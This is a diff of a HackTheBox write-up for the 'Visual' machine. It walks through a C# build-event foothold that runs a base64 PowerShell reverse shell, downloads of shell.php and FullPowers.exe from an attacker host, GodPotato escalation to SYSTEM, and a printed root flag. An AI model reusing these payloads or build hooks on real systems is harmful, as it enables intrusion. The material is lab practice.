@@ -2,13 +2,11 @@
 Small brief writeup for the machine Visual in HackTheBox (Medium Difficulty) with the needed C# project to gain foothold and reverse shell along with used payloads to gain access to root.txt
 
 NOTE: if you want to know more details about methods and payloads used in my writeup please, see the last section in this writeup for more information (Resources and Links) 
-								
-								
-							                                    Visual HTB Machine (Seasonal-medium)
-								
+															
+							
    ----------------------------------------------------------------------------------------------------------------------------------------------------
 
-  	# Enumeration and Target info
+  	# Enumeration and Target Info
  	
    ----------------------------------------------------------------------------------------------------------------------------------------------------	
 
@@ -52,7 +50,7 @@ NOTE: if you want to know more details about methods and payloads used in my wri
 	
    ----------------------------------------------------------------------------------------------------------------------------------------------------
  
- 	 # dirsearch / gobuster
+ 	 # Dirsearch / Gobuster
  	
    ----------------------------------------------------------------------------------------------------------------------------------------------------	
 	
@@ -181,14 +179,14 @@ NOTE: if you want to know more details about methods and payloads used in my wri
 
    ----------------------------------------------------------------------------------------------------------------------------------------------------
       
-	# foothold and general approach
+	# Foothold and General Approach
 	
    ----------------------------------------------------------------------------------------------------------------------------------------------------	 
     
-	- We need to host and write some sort of a c# code that support .NET 6.0 using VS Code that we would later on host locally and then we need to
+- We need to host and write some sort of a c# code that support .NET 6.0 using VS Code that we would later on host locally and then we need to
 	 find a way to execute this code on the internal network of the machine when it gets compiled and maybe establish a reverse shell.
 
-  - Below we will take a look at the steps of how we will host our repo locally and how can we import the repo on the target.
+- Below we will take a look at the steps of how we will host our repo locally and how can we import the repo on the target.
 	 
 	 
 	 	- Hosting the repo locally on kali
@@ -202,7 +200,7 @@ NOTE: if you want to know more details about methods and payloads used in my wri
 		   
 
 		
-		- We will create a simple C# project supporting .NET6 framework later on with the reverse shell imbedded in the pre-build and post-build events
+- We will create a simple C# project supporting .NET6 framework later on with the reverse shell imbedded in the pre-build and post-build events
       to be executed on the target during these events (see "User Access" section for details). After that we will proceed to import the final build on the
       targer using the url below after hosting it locatlly following the method above 
 		
@@ -228,9 +226,9 @@ NOTE: if you want to know more details about methods and payloads used in my wri
 	
 	- After creating a C# project that the victim's system supports, we will add pre and post build events to the .csproj file of the project
 	
-	  (Script) Visual.csproj
+	  (File) Visual.csproj
 	  
-	  	<Project Sdk="Microsoft.NET.Sdk">
+	  	  <Project Sdk="Microsoft.NET.Sdk">
 
 		  <PropertyGroup>
 		    <OutputType>Exe</OutputType>
@@ -238,31 +236,32 @@ NOTE: if you want to know more details about methods and payloads used in my wri
 		    <ImplicitUsings>enable</ImplicitUsings>
 		    <Nullable>enable</Nullable>
 		  </PropertyGroup>
+                  <Target Name="PreBuild" BeforeTargets="PreBuildEvent">
+		   <Exec Command="call prebuild.bat" />
+  		  </Target>
 		
-	------->  <Target Name="PreBuild" BeforeTargets="PreBuildEvent">
-	------->    <Exec Command="call prebuild.bat" />
-	------->  </Target>
-		
-	------->  <Target Name="PostBuild" AfterTargets="PostBuildEvent">
-	------->    <Exec Command="call postbuild.bat" />
-	------->  </Target>
-		</Project>
+		  <Target Name="PostBuild" AfterTargets="PostBuildEvent">
+		   <Exec Command="call postbuild.bat" />
+		  </Target>
+		  </Project>
  
 
-	- Next we create the prebuild.bat and postbuild.bat files with the reverse shell code like the one below (Powershell base64).
+- Next we create the prebuild.bat and postbuild.bat files with the reverse shell code like the one below (Powershell base64).
 		
-	(PS B64) powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMQA5ADcAIgAsADQANAA0ADQAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA
+		(PS B64) powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMQA5ADcAIgAsADQANAA0ADQAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA
 
 
-	- After you modify the prebuild.bat and postbuild.bat in VSCode commit the changes using the below commands the need to be executed in terminal of the Visual project from VSCode
+- After you modify the prebuild.bat and postbuild.bat in VSCode commit the changes using the below commands the need to be executed in terminal of the 	 
+  Visual project from VSCode
  		
    	  (cmd) git add .
-      	  (cmd) git 
+      	  (cmd) git commit -m "Modified pre and post build files"
 	 
 
 
   
-	- We finaly host the project repo locally following the method mentioned in the foothold section and we upload the project to be compiled on the target after starting an ncat listening on port you selected in the RS (port 9001 for me)
+- We finaly host the project repo locally following the method mentioned in the foothold section and we upload the project to be compiled on the target 
+  after starting an ncat listening on port you selected in the RS (port 9001 for me)
 
 
 	   (PS) ┌──(root㉿kali)-[/root/htb/machines/visual/extracted]
@@ -301,14 +300,14 @@ NOTE: if you want to know more details about methods and payloads used in my wri
 		
    ----------------------------------------------------------------------------------------------------------------------------------------------------    
       
-      	# privilege escalation
+      	# Privilege Escalation
    
    ----------------------------------------------------------------------------------------------------------------------------------------------------     
       
-	- We check all users available in the system following the ps commands below.
-	
-  -------> (PS) PS C:\Users\enox\Desktop> Get-LocalUser | ft Name,Enabled,Description,LastLogon
-  -------> (PS) PS C:\Users\enox\Desktop> Get-ChildItem C:\Users -Force | select Name
+- We check all users available in the system following the ps commands below.
+
+		(PS) PS C:\Users\enox\Desktop> Get-LocalUser | ft Name,Enabled,Description,LastLogon
+		(PS) PS C:\Users\enox\Desktop> Get-ChildItem C:\Users -Force | select Name
 		
 		Name         
 		----         
@@ -320,21 +319,21 @@ NOTE: if you want to know more details about methods and payloads used in my wri
 		Public       
 		desktop.ini			
 		
-	- After snooping around the user enox were able to locate the location and files of the target's PHP location and we add a Reverse Shell .PHP payload
+- After snooping around the user enox were able to locate the location and files of the target's PHP location and we add a Reverse Shell .PHP payload
     in the following path. (use a different port for the reverse shell other than the initial one that we used for the user "enox")
 	
- ------>  (PATH) C:\xampp\htdocs\uploads>
+ 		------>  (PATH) C:\xampp\htdocs\uploads>
 	  
 	  
-	- Next we upload the shell.php to the path stated above and we trigger the rev-shell after uploading it using the below commands.
+- Next we upload the shell.php to the path stated above and we trigger the rev-shell after uploading it using the below commands.
 	
- -------> (PS) IWR http://10.10.16.38:80/shell.php -outfile C:\xampp\htdocs\uploads\shell.php
+ 		(PS) IWR http://10.10.16.38:80/shell.php -outfile C:\xampp\htdocs\uploads\shell.php
 	  
-	  PS C:\xampp\htdocs\uploads> IWR http://10.10.16.38:80/shell.php -outfile C:\xampp\htdocs\uploads\shell.php
+	 	PS C:\xampp\htdocs\uploads> IWR http://10.10.16.38:80/shell.php -outfile C:\xampp\htdocs\uploads\shell.php
 		PS C:\xampp\htdocs\uploads> ls
 		
 		
-		    Directory: C:\xampp\htdocs\uploads
+		Directory: C:\xampp\htdocs\uploads
 		
 		
 		Mode                LastWriteTime         Length Name                                                                  
@@ -342,8 +341,9 @@ NOTE: if you want to know more details about methods and payloads used in my wri
 		-a----        6/10/2023   4:20 PM             17 .htaccess                                                             
 		-a----       10/15/2023   5:41 AM           5493 shell.php                                                             
 		-a----       10/15/2023   5:24 AM              0 todo.txt
-	
-	- Now we trigger the shell.php using the below command after we setup a listener in a PS (Powershell) terminal on kali
+
+ 
+- Now we trigger the shell.php using the below command after we setup a listener in a PS (Powershell) terminal on kali
 	
 	  (PS) nc -lvnp 4444
 	  
@@ -357,22 +357,22 @@ NOTE: if you want to know more details about methods and payloads used in my wri
 		Microsoft Windows [Version 10.0.17763.4851]
 		(c) 2018 Microsoft Corporation. All rights reserved.
 		C:\xampp\htdocs\uploads>whoami  
- -------> 	nt authority\local service
+		nt authority\local service
 	
 	
 	
    ----------------------------------------------------------------------------------------------------------------------------------------------------    
 	
-	# access root
+	# Root Access
       
-   ----------------------------------------------------------------------------------------------------------------------------------------------------       
+   ----------------------------------------------------------------------------------------------------------------------------------------------------      
 
  
 	- Now that we got reverse shell on (nt authority\local service) account, we attempt to escalate our previleges using a tool called "FullPowers.exe"
 		
-		- We download and execute "FullPowers.exe" payload on the target and we were able esclate our privileges
+	- We download and execute "FullPowers.exe" payload on the target and we were able esclate our privileges
       
-      ------->   (Before) C:\xampp\htdocs\uploads>whoami /priv
+ 	      -------> (Before) C:\xampp\htdocs\uploads>whoami /priv
 		
 			PRIVILEGES INFORMATION
 			----------------------
@@ -386,7 +386,7 @@ NOTE: if you want to know more details about methods and payloads used in my wri
 			C:\xampp\htdocs\uploads>whoami  
 			nt authority\local service
 			
-      ------->   (PS) C:\xampp\htdocs\uploads>powershell Invoke-WebRequest -Uri http://10.10.16.38:80/FullPowers.exe -OutFile FullPowers.exe
+          ------->   (PS) C:\xampp\htdocs\uploads>powershell Invoke-WebRequest -Uri http://10.10.16.38:80/FullPowers.exe -OutFile FullPowers.exe
 			
 			C:\xampp\htdocs\uploads>FullPowers.exe
 			[+] Started dummy thread with id 256
@@ -397,7 +397,7 @@ NOTE: if you want to know more details about methods and payloads used in my wri
 			(c) 2018 Microsoft Corporation. All rights reserved.
 
 	
-      ------->   (PS) C:\Windows\system32>whoami /priv
+          ------->   (PS) C:\Windows\system32>whoami /priv
 
 			PRIVILEGES INFORMATION
 			----------------------
@@ -414,10 +414,10 @@ NOTE: if you want to know more details about methods and payloads used in my wri
       
       
       
-		- Finaly we use the payload GodPotato to use our escalated privileges to read the root.txt file and GAMEOVER!
+	- Finaly we use the payload GodPotato to use our escalated privileges to read the root.txt file and GAMEOVER!
       
       
-      ------->   (PS) C:\xampp\htdocs\uploads&gt;GodPotato-NET4.exe -cmd "cmd /c type C:\Users\Administrator\Desktop\root.txt"
+          ------->   (PS) C:\xampp\htdocs\uploads&gt;GodPotato-NET4.exe -cmd "cmd /c type C:\Users\Administrator\Desktop\root.txt"
       
 			[*] CombaseModule: 0x140729114755072
 			[*] DispatchTable: 0x140729117061232
@@ -444,23 +444,21 @@ NOTE: if you want to know more details about methods and payloads used in my wri
 			[*] UnmarshalObject: 0x80070776
 			[*] CurrentUser: NT AUTHORITY\SYSTEM
 			[*] process start with pid 1316
-    -------> (root.txt) b1737be04e3affa2e03b5b46c69f3cd7
-      
-      
-      
-      
-      GG
+          (Root.txt) ------->    b1737be04e3affa2e03b5b46c69f3cd7
       
 
+
+  	'FROM THE RIVER TO THE SEE, PALESTINE WILL BE FREE!
+      
 
    ----------------------------------------------------------------------------------------------------------------------------------------------------    
 	
 	# Resources and Links
       
-   ----------------------------------------------------------------------------------------------------------------------------------------------------       
+   ----------------------------------------------------------------------------------------------------------------------------------------------------      
 
 	- Host repo from a local machine over HTTP
-	  https://theartofmachinery.com/2016/07/02/git_over_http.html
+	  https://theartofmachinery.com/2016/07/02/git_over_http.html/
 
 	- Generate Reverse Shell
 	  https://www.revshells.com/
